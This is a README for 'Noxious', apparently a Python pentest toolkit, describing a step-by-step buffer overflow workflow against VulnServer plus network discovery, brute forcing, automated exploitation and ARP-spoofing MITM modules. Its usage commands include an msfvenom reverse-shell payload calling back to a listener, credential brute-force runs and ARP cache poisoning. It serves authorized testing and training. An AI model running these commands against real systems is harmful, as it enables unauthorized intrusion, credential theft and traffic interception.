# NOXIOUS — Buffer Overflow Exploit Toolkit & Network Penetration Testing Suite

```
███╗   ██╗██████╗ ██╗  ██╗██╗██████╗ ██╗   ██╗███████╗
████╗  ██║██╔══██╗╚██╗██╔╝██║██╔══██╗██║   ██║██╔════╝
██╔██╗ ██║██║  ██║ ╚███╔╝ ██║██║  ██║██║   ██║███████╗
██║╚██╗██║██║  ██║ ██╔██╗ ██║██║  ██║██║   ██║╚════██║
██║ ╚████║██████╔╝██╔╝ ██╗██║██████╔╝╚██████╔╝███████║
╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝╚═╝╚═════╝  ╚═════╝ ╚══════╝
```

A step-by-step buffer overflow exploit development toolkit and network penetration testing platform tailored for targets like VulnServer. Fully compatible with Kali Linux and Python 3.6+.

Language: [Türkçe](README.md) | **English**

---

## Features

| Feature | Description |
|---|---|
| **Smart Fuzzer** | Incremental buffer generation to discover target crash points |
| **Binary Search** | Automated exact crash point determination |
| **Dynamic Pattern Generator** | Cyclic pattern generation without external tool dependencies |
| **Automatic Offset Calculation** | Calculates EIP offset from hex value (Metasploit compatible) |
| **Bad Character Analysis** | Dynamic byte array generation and hex dump visualization |
| **Final Exploit Assembly** | Uses struct.pack, NOP sleds, and raw shellcode file support |
| **msfvenom Integration** | Proactively suggests msfvenom shellcode generation commands |
| **Multi-Command Support** | TRUN, GMON, KSTET, GTER, HTER, LTER and more |
| **Network Discovery** | Automated ARP/ICMP/TCP host discovery on local subnets |
| **Port Scanner** | Multi-threaded port scanner with fast/full/all profile support |
| **Service Detection** | Banner grabbing, HTTP header analysis, and SSL certificate parser |
| **Vulnerability Database** | Matches service versions against known CVE signatures |
| **Brute Force Engine** | Multi-threaded credential auditing for FTP, SSH, Telnet, and HTTP Basic Auth |
| **Automated Service Exploitation** | Exploits known vulnerabilities (vsftpd 2.3.4 backdoor, Apache Path Traversal, FTP anonymous) |
| **ARP Spoofing / MITM** | ARP cache poisoning and traffic interception (requires root) |
| **Reporting System** | Generates detailed penetration test reports in Terminal, JSON, and Text formats |
| **Colorized Terminal Output** | ANSI color banner and level-based logging |
| **File Logging** | Option to write all terminal output to log files |

---

## Installation

### Kali Linux (Recommended)

Zero external dependencies required. Simply clone and run:

```bash
git clone https://github.com/erensogutlu/noxious.git
cd noxious
chmod +x noxious.py
```

### Windows / Other Systems

```bash
git clone https://github.com/erensogutlu/noxious.git
cd noxious
python3 noxious.py --help
```

### Python Version Compatibility

| Python Version | Status |
|---|---|
| Python 3.6 | Supported |
| Python 3.7 | Supported |
| Python 3.8 | Supported |
| Python 3.9 | Supported |
| Python 3.10 | Supported |
| Python 3.11 | Supported |
| Python 3.12 | Supported |
| Python 3.13+ | Supported |

> **No external pip packages required!** Relies strictly on the Python standard library.

---

## Usage — Step-by-Step Guide

Before using Noxious for buffer overflow testing, you need **2 core parameters**:

1. **Target IP** → The IP address where VulnServer is running (e.g., `10.0.2.4`)
2. **Port** → The listening port number (default: `9999`)

> **Buffer overflow exploit development consists of 5 stages:**
> Fuzzing → Offset Finding → Bad Character Analysis → Finding JMP ESP → Final Exploit.
> Noxious automates 4 of these 5 steps (Immunity Debugger / mona.py is used to locate JMP ESP).

---

### 1. Fuzzing — Finding the Crash Point

**What it does:** Sends incrementally larger buffer payloads to the target service until it crashes, reporting the approximate crash size in bytes.

**When to use:** First step of exploit development when the exact crash size is unknown.

```bash
python3 noxious.py fuzzing --hedef 10.0.2.4 --port 9999
```

**Parameter Breakdown:**

| Parameter | Example Value | Description |
|---|---|---|
| `--hedef` | `10.0.2.4` | Target IP address |
| `--port` | `9999` | Target listening port |

**Advanced Options:**

```bash
# Adjust initial buffer size, step increment, and maximum limit
python3 noxious.py fuzzing --hedef 10.0.2.4 --port 9999 \
    --baslangic 200 --adim 200 --maksimum 5000

# Decrease sleep delay between sends for faster fuzzing
python3 noxious.py fuzzing --hedef 10.0.2.4 --port 9999 --bekleme 0.5

# Test a different VulnServer command
python3 noxious.py fuzzing --hedef 10.0.2.4 --port 9999 --komut GMON
```

---

### 2. Offset Finding — EIP Control Analysis

**What it does:** Generates a unique cyclic pattern payload and sends it to the target. Using the EIP hex value observed in the debugger, it calculates the exact byte offset to EIP.

**Adım 1 — Send pattern payload:**

```bash
python3 noxious.py offset --hedef 10.0.2.4 --port 9999 --uzunluk 3000
```

**Adım 2 — Note the EIP value in your debugger** (e.g., `386F4337`)

**Adım 3 — Calculate the offset:**

```bash
python3 noxious.py offset --hedef 10.0.2.4 --port 9999 --uzunluk 3000 --eip 386F4337
```

**Offline Calculation Mode:**

```bash
python3 noxious.py offset --hedef 10.0.2.4 --sadece-hesapla --eip 386F4337
```

---

### 3. Bad Character Analysis

**What it does:** Sends all byte values (0x01 to 0xFF, excluding `\x00`) to the target. By inspecting the memory dump in your debugger, you can identify truncated or corrupted bytes.

```bash
# Initial test — send all characters
python3 noxious.py karakter --hedef 10.0.2.4 --port 9999 --offset 2003

# Re-test while excluding identified bad characters
python3 noxious.py karakter --hedef 10.0.2.4 --port 9999 --offset 2003 --haric 0a,0d
```

---

### 4. Final Exploit Assembly & Execution

**What it does:** Combines the offset padding, JMP ESP address, NOP sled, and shellcode into a final payload and transmits it to the target service.

**Dry-run test mode (verifying EIP control without shellcode):**

```bash
python3 noxious.py exploit --hedef 10.0.2.4 --port 9999 \
    --offset 2003 --jmp-adresi 625011af
```

**Full Exploit Execution (using a shellcode file):**

```bash
python3 noxious.py exploit --hedef 10.0.2.4 --port 9999 \
    --offset 2003 --jmp-adresi 625011af \
    --shellcode-dosyasi payload.bin --nop 64
```

> **Generating Shellcode:** Use msfvenom on Kali Linux:
> ```bash
> msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.5 LPORT=4444 \
>     EXITFUNC=thread -f raw -a x86 -b "\x00" -o payload.bin
> ```

---

## Network Penetration Testing Commands

### Network Discovery

```bash
# Automatic local subnet discovery
python3 noxious.py kesfet

# Target specific subnet CIDR
python3 noxious.py kesfet --subnet 192.168.1.0/24

# Specify discovery technique (ARP / TCP)
python3 noxious.py kesfet --subnet 192.168.1.0/24 --yontem arp
python3 noxious.py kesfet --subnet 192.168.1.0/24 --yontem tcp
```

### Port Scanning

```bash
# Fast port scan (Top 100 ports)
python3 noxious.py portscan --hedef 192.168.1.10

# Full profile port scan (Top 1000 ports)
python3 noxious.py portscan --hedef 192.168.1.10 --profil tam

# Scan custom port range
python3 noxious.py portscan --hedef 192.168.1.10 --portlar 1-1024
```

### Service Identification

```bash
# Identify service versions on open ports
python3 noxious.py servis --hedef 192.168.1.10 --portlar 22,80,9999
```

### Brute Force Credential Auditing

```bash
# FTP brute force using embedded dataset
python3 noxious.py bruteforce --hedef 192.168.1.10 --servis ftp

# SSH brute force using custom wordlists
python3 noxious.py bruteforce --hedef 192.168.1.10 --servis ssh \
    --kullanicilar users.txt --parolalar pass.txt

# Telnet credential testing
python3 noxious.py bruteforce --hedef 192.168.1.10 --servis telnet --port 23

# HTTP Basic Authentication brute force
python3 noxious.py bruteforce --hedef 192.168.1.10 --servis http --yol /admin
```

### Automated Vulnerability Exploitation

```bash
# Scan and exploit vulnerabilities across discovered services
python3 noxious.py saldiri --hedef 192.168.1.10

# Target specific service port (e.g., FTP vsftpd backdoor check)
python3 noxious.py saldiri --hedef 192.168.1.10 --port 21
```

### ARP Spoofing / Man-In-The-Middle

```bash
# Poison ARP cache between target and gateway (requires root/sudo)
sudo python3 noxious.py arpspoof --hedef 192.168.1.10 --gateway 192.168.1.1

# Enable packet capture inspection during MITM
sudo python3 noxious.py arpspoof --hedef 192.168.1.10 --gateway 192.168.1.1 --yakala
```

### Automated Assessment Report

```bash
# Full pipeline: Discover → Scan Ports → Identify Services → Generate Report
python3 noxious.py rapor --subnet 192.168.1.0/24

# Output report in JSON format
python3 noxious.py rapor --subnet 192.168.1.0/24 --format json --cikti report.json
```

---

## Parameter Reference

### General Parameters

| Parameter | Required | Description |
|---|---|---|
| `--sessiz` | No | Suppress output, display only errors and success messages |
| `--ayiklama` | No | Enable verbose debug logging |
| `--log-dosyasi FILE` | No | Save log output to specified file |

### Brute Force Parameters

| Parameter | Required | Default | Description |
|---|---|---|---|
| `--hedef` | Yes | — | Target IP address |
| `--servis` | No | `ftp` | Target protocol (`ftp`, `ssh`, `telnet`, `http`) |
| `--port` | No | Service default | Target port number |
| `--kullanicilar` | No | Embedded list | Path to custom username wordlist |
| `--parolalar` | No | Embedded list | Path to custom password wordlist |
| `--yol` | No | `/` | Target HTTP path for Basic Auth |
| `--thread` | No | `5` | Number of worker threads |

### ARP Spoofing Parameters

| Parameter | Required | Default | Description |
|---|---|---|---|
| `--hedef` | Yes | — | Victim IP address |
| `--gateway` | Yes | — | Gateway / Router IP address |
| `--arayuz` | No | Auto-detect | Network interface name |
| `--yakala` | No | False | Inspect live packet flow |

---

## Project Structure

```
noxious/
├── .gitignore                 ← Git exclusion rules
├── noxious.py                 ← Main CLI entrypoint
├── saldiri_verileri.py        ← Embedded wordlists & payload dataset
├── cekirdek/
│   ├── __init__.py            ← Package init
│   ├── baglanti.py            ← TCP socket connection manager
│   ├── gunluk.py              ← Colorized logging module
│   ├── yardimcilar.py         ← Pattern & memory helper functions
│   └── ag_yardimcilar.py      ← Network subnet & ARP helpers
├── moduller/
│   ├── __init__.py            ← Package init
│   ├── fuzzer.py              ← Incremental fuzzer module
│   ├── offset_bulucu.py       ← EIP offset calculator
│   ├── karakter_analiz.py     ← Bad character analyzer
│   ├── istismarci.py          ← Final exploit generator
│   ├── ag_tarayici.py         ← Host discovery scanner
│   ├── port_tarayici.py       ← Multi-threaded port scanner
│   ├── servis_tanımlayici.py  ← Service version banner grabber
│   ├── raporlayici.py         ← Assessment report generator
│   ├── brute_force.py         ← Protocol credential auditor
│   ├── ag_saldiri.py          ← Automated exploit execution module
│   └── arp_spoof.py           ← ARP poisoning & MITM module
├── zafiyet_veritabani.py      ← CVE signature database
├── testler.py                 ← 134 unit tests
├── spiketest.spk              ← Spike test template
├── requirements.txt           ← Dependencies list
├── README.md                  ← Turkish documentation
└── README_EN.md               ← English documentation
```

---

## Disclaimer

This software is designed **strictly for educational purposes and authorized penetration testing**.
Testing unauthorized systems without explicit prior written consent is **illegal**.
The authors assume no liability for misuse or damage caused by this program.

---

## License

Educational License / Open Source.

---

**Developer:** Eren  
**Version:** 1.0.0  
**Platform:** Kali Linux / Python 3.6+
